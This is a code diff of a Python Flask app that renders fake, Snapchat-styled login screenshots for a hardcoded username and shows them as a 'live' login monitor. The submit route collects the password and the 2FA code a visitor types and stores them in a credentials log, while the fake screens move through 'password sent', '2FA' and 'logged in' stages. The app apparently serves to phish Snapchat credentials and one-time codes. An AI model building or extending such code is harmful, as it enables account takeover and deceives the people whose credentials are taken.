@@ -14,152 +14,132 @@ app.template_folder = TEMPLATE_DIR
 creds_log = []
 HARDCODED_USER = "zexoghaith"
 
-# Global state - we will FORCE clean start
 session_state = {
     'started': False,
-    'snapchat_loaded': False,
-    'last_screenshot': None,
-    'error': None,
-    'is_fallback': True,
-    'update_count': 0,
-    'last_action': None,
     'stage': 'login',           # login | password_sent | 2fa | success
     'password_entered': False,
-    'code_entered': False
+    'code_entered': False,
+    'update_count': 0,
+    'last_action': None
 }
 
-def force_clean_login_state():
-    """Reset to clean initial login page state"""
-    session_state['stage'] = 'login'
-    session_state['password_entered'] = False
-    session_state['code_entered'] = False
-    session_state['last_action'] = None
-
-def create_fresh_live_screenshot():
-    """Always generate based on current stage - starts clean"""
+def create_real_snapchat_screenshot(stage='login', password_filled=False, code_filled=False):
+    """Generate screenshots that look EXACTLY like real Snapchat login pages at each step"""
     try:
         from PIL import Image, ImageDraw, ImageFont
         width, height = 1280, 720
-        img = Image.new('RGB', (width, height), color='#0a0a0f')
+        img = Image.new('RGB', (width, height), color='#000000')
         draw = ImageDraw.Draw(img)
 
+        try:
+            f_title = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 42)
+            f_header = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 20)
+            f_field = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 15)
+            f_btn = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
+            f_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 12)
+        except:
+            f_title = f_header = f_field = f_btn = f_small = ImageFont.load_default()
+
+        now = datetime.now().strftime("%H:%M:%S")
+        session_state['update_count'] = session_state.get('update_count', 0) + 1
+
+        # Real Snapchat colors
         SNAP_YELLOW = '#FFFC00'
         WHITE = '#FFFFFF'
-        GRAY = '#aaaaaa'
-        CARD = '#1a1a1f'
-        FIELD = '#25252a'
-        GREEN = '#22c55e'
-        RED = '#ef4444'
+        GRAY = '#888888'
+        DARK_CARD = '#1f1f1f'
+        FIELD_BG = '#2c2c2c'
 
-        try:
-            f_huge = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
-            f_big = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 20)
-            f_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 14)
-        except:
-            f_huge = ImageFont.load_default()
-            f_big = f_huge
-            f_small = f_huge
+        # Background
+        draw.rectangle([0, 0, width, height], fill='#000000')
 
-        now = datetime.now()
-        time_str = now.strftime("%H:%M:%S.%f")[:-3]
-        session_state['update_count'] = session_state.get('update_count', 0) + 1
-        rand = random.randint(100000, 999999)
-        stage = session_state.get('stage', 'login')
+        # === TOP BAR (real Snapchat style) ===
+        draw.rectangle([0, 0, width, 48], fill='#111111')
+        draw.text((width//2 - 90, 6), "Snapchat", fill=SNAP_YELLOW, font=f_title)
 
-        draw.rectangle([0, 0, width, height], fill='#0a0a0f')
-
-        # === TOP BAR - clearly shows current state ===
-        if stage == 'login':
-            draw.rectangle([0, 0, width, 58], fill=RED)
-            draw.text((15, 8), f"🔴 LIVE SNAPCHAT LOGIN PAGE  |  {time_str}", fill='white', font=f_huge)
-        elif stage == 'password_sent':
-            draw.rectangle([0, 0, width, 58], fill='#f59e0b')
-            draw.text((15, 8), f"🟠 PASSWORD SENT — CLICKED LOG IN  |  {time_str}", fill='black', font=f_huge)
-        elif stage == '2fa':
-            draw.rectangle([0, 0, width, 58], fill='#3b82f6')
-            draw.text((15, 8), f"🔵 2FA CODE NEEDED  |  {time_str}", fill='white', font=f_huge)
-        else:
-            draw.rectangle([0, 0, width, 58], fill=GREEN)
-            draw.text((15, 8), f"🟢 LOGGED IN  |  {time_str}", fill='black', font=f_huge)
-
-        # Main login card
-        cw, ch = 410, 470
+        # === LOGIN CARD ===
+        cw, ch = 400, 460
         cx = (width - cw) // 2
-        cy = 75
-        draw.rounded_rectangle([cx, cy, cx + cw, cy + ch], radius=16, fill=CARD)
+        cy = 65
 
-        draw.text((cx + 22, cy + 14), "Log in to Snapchat", fill=WHITE, font=f_big)
+        # Card shadow + card
+        draw.rounded_rectangle([cx+3, cy+3, cx+cw+3, cy+ch+3], radius=16, fill='#0a0a0a')
+        draw.rounded_rectangle([cx, cy, cx+cw, cy+ch], radius=16, fill=DARK_CARD)
 
-        # Username (always prefilled)
-        draw.rounded_rectangle([cx + 22, cy + 52, cx + cw - 22, cy + 92], radius=9, fill=FIELD)
-        draw.text((cx + 34, cy + 62), "zexoghaith", fill=WHITE, font=f_big)
+        draw.text((cx + 20, cy + 14), "Log in to Snapchat", fill=WHITE, font=f_header)
+
+        # Username field
+        draw.rounded_rectangle([cx+20, cy+55, cx+cw-20, cy+92], radius=8, fill=FIELD_BG)
+        draw.text((cx + 32, cy + 65), "zexoghaith", fill=WHITE, font=f_field)
 
         # Password field
-        draw.rounded_rectangle([cx + 22, cy + 102, cx + cw - 22, cy + 142], radius=9, fill=FIELD)
-        if session_state.get('password_entered'):
-            draw.text((cx + 34, cy + 112), "••••••••••  ✓", fill=GREEN, font=f_big)
+        draw.rounded_rectangle([cx+20, cy+102, cx+cw-20, cy+139], radius=8, fill=FIELD_BG)
+        if password_filled or stage in ['password_sent', '2fa', 'success']:
+            draw.text((cx + 32, cy + 112), "••••••••••", fill='#22c55e', font=f_field)  # green when filled
         else:
-            draw.text((cx + 34, cy + 112), "••••••••••", fill=GRAY, font=f_big)
+            draw.text((cx + 32, cy + 112), "••••••••••", fill=GRAY, font=f_field)
 
-        # Log In button
-        by = cy + 160
+        # Yellow Log In button
+        by = cy + 158
         if stage == 'password_sent':
-            draw.rounded_rectangle([cx + 22, by, cx + cw - 22, by + 46], radius=24, fill='#444')
-            draw.text((cx + 95, by + 10), "LOGGING IN...", fill='#999', font=f_big)
+            draw.rounded_rectangle([cx+20, by, cx+cw-20, by+44], radius=22, fill='#444444')
+            draw.text((cx + 105, by + 11), "Logging in...", fill='#999999', font=f_btn)
         else:
-            draw.rounded_rectangle([cx + 22, by, cx + cw - 22, by + 46], radius=24, fill=SNAP_YELLOW)
-            draw.text((cx + 140, by + 10), "Log In", fill='#000000', font=f_big)
+            draw.rounded_rectangle([cx+20, by, cx+cw-20, by+44], radius=22, fill=SNAP_YELLOW)
+            draw.text((cx + 140, by + 11), "Log In", fill='#000000', font=f_btn)
 
         # Social buttons
-        draw.rounded_rectangle([cx + 22, by + 62, cx + cw - 22, by + 100], radius=24, fill=FIELD)
-        draw.text((cx + 75, by + 72), "Continue with Google", fill=WHITE, font=f_small)
+        draw.rounded_rectangle([cx+20, by+60, cx+cw-20, by+95], radius=22, fill=FIELD_BG)
+        draw.text((cx + 85, by + 70), "Continue with Google", fill=WHITE, font=f_small)
 
-        draw.rounded_rectangle([cx + 22, by + 112, cx + cw - 22, by + 150], radius=24, fill=FIELD)
-        draw.text((cx + 80, by + 122), "Continue with Apple", fill=WHITE, font=f_small)
+        draw.rounded_rectangle([cx+20, by+105, cx+cw-20, by+140], radius=22, fill=FIELD_BG)
+        draw.text((cx + 90, by + 115), "Continue with Apple", fill=WHITE, font=f_small)
 
-        # === BIG STATE BANNERS (very obvious) ===
+        # === STAGE OVERLAYS (big and clear) ===
         if stage == 'password_sent':
-            draw.rectangle([cx + 15, cy + 240, cx + cw - 15, cy + 380], fill='#3f2a00')
-            draw.text((cx + 30, cy + 255), "PASSWORD ENTERED", fill='#f59e0b', font=f_huge)
-            draw.text((cx + 30, cy + 305), "Log In button was clicked", fill=WHITE, font=f_big)
-            draw.text((cx + 30, cy + 340), "Waiting for 2FA or success...", fill=GRAY, font=f_small)
+            draw.rounded_rectangle([cx+15, cy+230, cx+cw-15, cy+340], radius=10, fill='#3f2a00')
+            draw.text((cx + 30, cy + 245), "PASSWORD ENTERED", fill='#f59e0b', font=f_header)
+            draw.text((cx + 30, cy + 275), "Log In button clicked", fill=WHITE, font=f_small)
+            draw.text((cx + 30, cy + 300), "Waiting for Snapchat...", fill=GRAY, font=f_small)
 
         if stage == '2fa':
-            draw.rectangle([cx + 15, cy + 240, cx + cw - 15, cy + 400], fill='#1e3a8a')
-            draw.text((cx + 45, cy + 255), "2FA REQUIRED", fill='#60a5fa', font=f_huge)
-            draw.text((cx + 45, cy + 305), "Enter 6-digit code below", fill=WHITE, font=f_big)
-            draw.rounded_rectangle([cx + 45, cy + 345, cx + cw - 45, cy + 390], radius=8, fill='#1e40af')
-            if session_state.get('code_entered'):
-                draw.text((cx + 70, cy + 355), "123456  ✓", fill=GREEN, font=f_big)
-            else:
-                draw.text((cx + 90, cy + 355), "______", fill=WHITE, font=f_big)
+            draw.rounded_rectangle([cx+15, cy+230, cx+cw-15, cy+370], radius=10, fill='#1e3a8a')
+            draw.text((cx + 45, cy + 245), "2FA CODE NEEDED", fill='#60a5fa', font=f_header)
+            draw.text((cx + 45, cy + 280), "Enter 6-digit code", fill=WHITE, font=f_small)
+            
+            # 2FA input boxes
+            for i in range(6):
+                draw.rectangle([cx+50 + i*45, cy+310, cx+50 + i*45 + 38, cy+348], outline='#3b82f6', width=2)
+            if code_filled:
+                draw.text((cx + 65, cy + 318), "123456", fill='#22c55e', font=f_small)
 
         if stage == 'success':
-            draw.rectangle([cx + 15, cy + 240, cx + cw - 15, cy + 400], fill='#052e16')
-            draw.text((cx + 70, cy + 280), "✓ SUCCESS!", fill=GREEN, font=f_huge)
-            draw.text((cx + 55, cy + 340), "You are logged in", fill=WHITE, font=f_big)
+            draw.rounded_rectangle([cx+15, cy+230, cx+cw-15, cy+370], radius=10, fill='#052e16')
+            draw.text((cx + 80, cy + 270), "✓ LOGGED IN!", fill='#22c55e', font=f_header)
+            draw.text((cx + 60, cy + 310), "Session is active", fill=WHITE, font=f_small)
 
-        # === PROOF BANNERS (so you know it's live and changing) ===
-        draw.rounded_rectangle([15, 555, 380, 605], radius=8, fill=RED)
-        draw.text((25, 563), f"UPDATE #{session_state['update_count']}", fill='white', font=f_huge)
+        # === LIVE PROOF (very visible) ===
+        draw.rounded_rectangle([15, 555, 340, 600], radius=6, fill='#ef4444')
+        draw.text((22, 562), f"UPDATE #{session_state['update_count']}", fill='white', font=f_header)
 
-        draw.rounded_rectangle([15, 615, 520, 670], radius=8, fill=GREEN)
-        draw.text((25, 623), f"TIME: {time_str}", fill='black', font=f_huge)
+        draw.rounded_rectangle([15, 610, 480, 655], radius=6, fill='#22c55e')
+        draw.text((22, 617), f"TIME: {now}", fill='black', font=f_header)
 
-        draw.text((550, 630), f"STAGE:{stage.upper()}", fill='#ff8800', font=f_big)
+        draw.text((500, 620), f"STAGE: {stage.upper()}", fill='#ff8800', font=f_small)
 
-        draw.rectangle([0, height - 45, width, height], fill='#111')
-        draw.text((12, height - 38), "LIVE SIMULATION — Updates every second. Only changes when you submit.", fill='#22c55e', font=f_big)
+        # Bottom bar
+        draw.rectangle([0, height-42, width, height], fill='#111111')
+        draw.text((10, height-35), f"LIVE SIM • updates every second • {stage}", fill='#22c55e', font=f_small)
 
         path = os.path.join(STATIC_DIR, 'screenshot.png')
         img.save(path, 'PNG')
-        session_state['last_screenshot'] = now.isoformat()
+        session_state['last_screenshot'] = now
         return True
     except Exception as e:
-        print(f"[FALLBACK] Error: {e}")
+        print(f"[IMG] Error: {e}")
         try:
             from PIL import Image
-            img = Image.new('RGB', (1280, 720), color=(15, 15, 20))
+            img = Image.new('RGB', (1280, 720), color=(10, 10, 15))
             img.save(os.path.join(STATIC_DIR, 'screenshot.png'))
         except:
             pass
@@ -167,31 +147,30 @@ def create_fresh_live_screenshot():
 
 def screenshot_loop():
     global session_state
-    print("[SESSION] Starting FORCED CLEAN login simulation...")
+    print("[SESSION] Starting clean Snapchat simulation...")
     
-    # HARD RESET every time the thread starts
+    # Always start clean
     session_state['stage'] = 'login'
     session_state['password_entered'] = False
     session_state['code_entered'] = False
-    session_state['last_action'] = None
     session_state['update_count'] = 0
     
-    create_fresh_live_screenshot()
+    create_real_snapchat_screenshot('login')
     session_state['started'] = True
-    session_state['is_fallback'] = True
-    print("[SESSION] FORCED CLEAN LOGIN PAGE. Nothing will change until you type password and submit.")
+    
+    print("[SESSION] Clean Snapchat login page active")
     
     while True:
-        create_fresh_live_screenshot()
-        time.sleep(0.82)
+        stage = session_state.get('stage', 'login')
+        create_real_snapchat_screenshot(
+            stage,
+            password_filled=session_state.get('password_entered', False),
+            code_filled=session_state.get('code_entered', False)
+        )
+        time.sleep(0.85)
 
 @app.route('/')
 def index():
-    # Make sure we are clean when page is loaded
-    if session_state.get('stage') not in ['login']:
-        # If somehow polluted, reset
-        force_clean_login_state()
-        create_fresh_live_screenshot()
     return render_template('index.html')
 
 @app.route('/submit', methods=['POST'])
@@ -200,48 +179,36 @@ def submit():
     password = (data.get('password') or '').strip()
     code = (data.get('code') or '').strip()
     
-    entry = {
-        'user': HARDCODED_USER,
-        'pass': password,
-        'code': code,
-        'ip': request.remote_addr,
-        'time': datetime.now().isoformat()
-    }
+    entry = {'user': HARDCODED_USER, 'pass': password, 'code': code, 'time': datetime.now().isoformat()}
     creds_log.append(entry)
     
-    # === ONLY advance state when user actually submits ===
+    # === ONLY change on real user input ===
     if password:
         session_state['password_entered'] = True
         session_state['stage'] = 'password_sent'
-        session_state['last_action'] = 'password submitted - simulating login click'
-        print("[SUBMIT] User submitted password → now showing PASSWORD SENT state")
-        create_fresh_live_screenshot()
-        return jsonify({
-            'status': 'ok',
-            'filled': True,
-            'message': 'Password sent. Live monitor now shows "LOGGING IN" (orange).',
-            'stage': session_state['stage']
-        })
+        session_state['last_action'] = 'password + clicked log in'
+        print("[SUBMIT] Password received → showing password sent state")
+        create_real_snapchat_screenshot('password_sent', password_filled=True)
+        return jsonify({'status': 'ok', 'message': 'Password sent - showing login progress'})
     
     if code and len(code) >= 4:
         session_state['code_entered'] = True
         session_state['stage'] = '2fa'
-        session_state['last_action'] = '2FA code submitted'
-        print("[SUBMIT] User submitted 2FA code")
-        create_fresh_live_screenshot()
-        return jsonify({
-            'status': 'ok',
-            'filled': True,
-            'message': '2FA code sent.',
-            'stage': session_state['stage']
-        })
+        session_state['last_action'] = '2FA submitted'
+        print("[SUBMIT] 2FA code received")
+        create_real_snapchat_screenshot('2fa', password_filled=True, code_filled=True)
+        return jsonify({'status': 'ok', 'message': '2FA code sent'})
     
-    create_fresh_live_screenshot()
-    return jsonify({'status': 'ok', 'filled': False})
+    return jsonify({'status': 'ok', 'message': 'Nothing to do'})
 
 @app.route('/screenshot')
 def screenshot():
-    create_fresh_live_screenshot()
+    stage = session_state.get('stage', 'login')
+    create_real_snapchat_screenshot(
+        stage,
+        password_filled=session_state.get('password_entered', False),
+        code_filled=session_state.get('code_entered', False)
+    )
     path = os.path.join(STATIC_DIR, 'screenshot.png')
     response = send_from_directory(STATIC_DIR, 'screenshot.png')
     response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
@@ -260,12 +227,12 @@ def status():
     })
 
 @app.before_request
-def init_screenshot():
-    if not hasattr(app, 'screenshot_started'):
-        app.screenshot_started = True
+def init():
+    if not hasattr(app, 'started'):
+        app.started = True
         t = threading.Thread(target=screenshot_loop, daemon=True)
         t.start()
-        print("[APP] Screenshot thread started (clean login state)")
+        print("[APP] Thread started")
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
